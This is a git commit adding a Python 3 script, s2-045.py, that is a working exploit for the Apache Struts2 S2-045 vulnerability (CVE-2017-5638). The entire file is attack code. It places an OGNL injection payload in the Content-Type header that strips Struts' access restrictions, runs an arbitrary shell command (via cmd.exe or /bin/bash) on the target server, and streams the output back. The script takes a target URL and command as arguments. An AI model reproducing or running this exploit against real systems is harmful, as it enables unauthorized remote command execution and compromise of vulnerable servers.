600635d179ca51a9083ee707aa64db79c76ffe03
whale4u <whale4u@hotmail.com>
2021-02-23 19:28:48 +0800

    增加py3 s2-045脚本

---
+++ s2-045.py
@@ -0,0 +1,54 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import urllib.request
+import http.client
+
+'''
+py3版本s2-045脚本
+代码出处，有改动：
+https://raw.githubusercontent.com/Medicean/VulApps/master/s/struts2/s2-045/poc.py
+'''
+
+
+def exploit(url, cmd):
+    payload = "%{(#_='multipart/form-data')."
+    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    payload += "(#_memberAccess?"
+    payload += "(#_memberAccess=#dm):"
+    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+    payload += "(#ognlUtil.getExcludedClasses().clear())."
+    payload += "(#context.setMemberAccess(#dm))))."
+    payload += "(#cmd='%s')." % cmd
+    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+    payload += "(#ros.flush())}"
+
+    try:
+        header = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+        req = urllib.request.Request(url, headers=header)
+        response = urllib.request.urlopen(req)
+        page = response.read()
+    except http.client.IncompleteRead as e:
+        page = e.partial
+
+    print(page)
+    return page
+
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) != 3:
+        print("[*] struts2_S2-045.py <url> <cmd>")
+    else:
+        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
+        url = sys.argv[1]
+        cmd = sys.argv[2]
+        print("[*] cmd: %s\n" % cmd)
+        exploit(url, cmd)
